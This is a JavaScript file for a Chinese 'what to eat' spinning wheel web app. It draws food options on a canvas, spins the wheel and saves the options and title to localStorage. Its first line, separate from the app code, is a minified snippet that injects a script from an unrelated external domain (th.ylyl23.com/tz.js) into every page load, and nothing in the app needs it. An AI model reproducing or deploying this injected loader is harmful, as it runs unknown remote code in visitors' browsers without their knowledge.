(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
// 1. 获取 DOM 元素
const canvas = document.getElementById('wheelCanvas');
const ctx = canvas.getContext('2d');
const spinBtn = document.getElementById('spinBtn');
const updateBtn = document.getElementById('updateBtn');
const optionsText = document.getElementById('optionsText');
const optionsListDisplay = document.getElementById('optionsListDisplay');
const mainTitle = document.getElementById('mainTitle'); // 新增：获取标题元素

// 获取 Tab 元素
const tabEdit = document.getElementById('tab-edit');
const tabList = document.getElementById('tab-list');
const contentEdit = document.getElementById('content-edit');
const contentList = document.getElementById('content-list');


// 2. 初始数据和配置
let options = [
    '饺子', '盖浇饭', '卤肉饭', '烤肉饭',
    '黄焖鸡', '麻辣香锅', '火锅', '石锅拌饭',
    '酸菜鱼', '披萨', '汉堡', '沙县小吃'
];
// 备选颜色
const colors = [
    '#FADBD8', '#EBDEF0', '#D6EAF8', '#D1F2EB', '#D4EFDF',
    '#FCF3CF', '#F6DDCC', '#FAD7A0', '#FDEBD0', '#EAECEE',
    '#D6DBDF', '#FADBD8'
];

let currentRotation = 0; 
let isSpinning = false;
const centerX = canvas.width / 2;
const centerY = canvas.height / 2;
const radius = canvas.width / 2 - 10; 

// 3. 绘制转盘函数
function drawWheel() {
    const arcSize = (2 * Math.PI) / options.length; 
    ctx.clearRect(0, 0, canvas.width, canvas.height); 

    for (let i = 0; i < options.length; i++) {
        const angle = i * arcSize;
        
        ctx.beginPath();
        ctx.fillStyle = colors[i % colors.length];
        ctx.moveTo(centerX, centerY);
        ctx.arc(centerX, centerY, radius, angle, angle + arcSize);
        ctx.closePath();
        ctx.fill();

        ctx.save();
        ctx.fillStyle = '#333'; 
        ctx.font = 'bold 18px Arial'; 
        ctx.translate(centerX, centerY);
        ctx.rotate(angle + arcSize / 2); 
        ctx.textAlign = 'right';
        ctx.fillText(options[i], radius - 15, 10);
        ctx.restore();
    }
}

// 4. 旋转功能
spinBtn.addEventListener('click', () => {
    if (isSpinning) return;
    isSpinning = true;

    const randomDegrees = Math.random() * 360 + 360 * 5;
    const finalRotation = currentRotation + randomDegrees;

    canvas.style.transition = 'transform 5s cubic-bezier(0.25, 0.1, 0.25, 1)';
    canvas.style.transform = `rotate(${finalRotation}deg)`;
    currentRotation = finalRotation;

    setTimeout(() => {
        isSpinning = false;
        
        const arcSizeDegrees = 360 / options.length;
        const normalizedAngle = (270 - (currentRotation % 360) + 360) % 360; 
        const winnerIndex = Math.floor(normalizedAngle / arcSizeDegrees);
        
        alert(`你抽中了: ${options[winnerIndex]}！`);
        canvas.style.transition = 'none';

    }, 5000); 
});

// 6. 更新转盘功能
updateBtn.addEventListener('click', () => {
    const newOptionsText = optionsText.value;
    const newOptions = newOptionsText.split('\n')
                                     .filter(opt => opt.trim() !== '');
    
    if (newOptions.length > 0) {
        options = newOptions;
        localStorage.setItem('foodWheelOptions', JSON.stringify(options));
        
        updateDisplayList(); 
        drawWheel();
        
        alert('转盘已更新！');
    } else {
        alert('请输入至少一个选项！');
    }
});

// 8. 更新预览列表函数
function updateDisplayList() {
    optionsListDisplay.innerHTML = ''; 
    options.forEach(option => {
        const li = document.createElement('li');
        li.textContent = option;
        optionsListDisplay.appendChild(li);
    });
}

// 7. 页面加载时执行的初始化函数
function init() {
    
    // --- 新增：加载和保存可编辑标题 ---
    const savedTitle = localStorage.getItem('wheelTitle');
    if (savedTitle) {
        mainTitle.textContent = savedTitle;
    }
    // 添加"失去焦点"事件监听，用于保存标题
    mainTitle.addEventListener('blur', () => {
        localStorage.setItem('wheelTitle', mainTitle.textContent);
    });
    // --- 标题逻辑结束 ---


    // 尝试加载选项列表
    const savedOptions = localStorage.getItem('foodWheelOptions');
    if (savedOptions) {
        options = JSON.parse(savedOptions);
    }

    // 填充内容
    optionsText.value = options.join('\n');
    updateDisplayList(); 
    drawWheel();

    // --- Tab 点击事件 ---
    tabEdit.addEventListener('click', () => {
        tabEdit.classList.add('active');
        tabList.classList.remove('active');
        contentEdit.classList.add('active');
        contentList.classList.remove('active');
    });

    tabList.addEventListener('click', () => {
        tabList.classList.add('active');
        tabEdit.classList.remove('active');
        contentList.classList.add('active');
        contentEdit.classList.remove('active');
    });
}

// 启动！
init();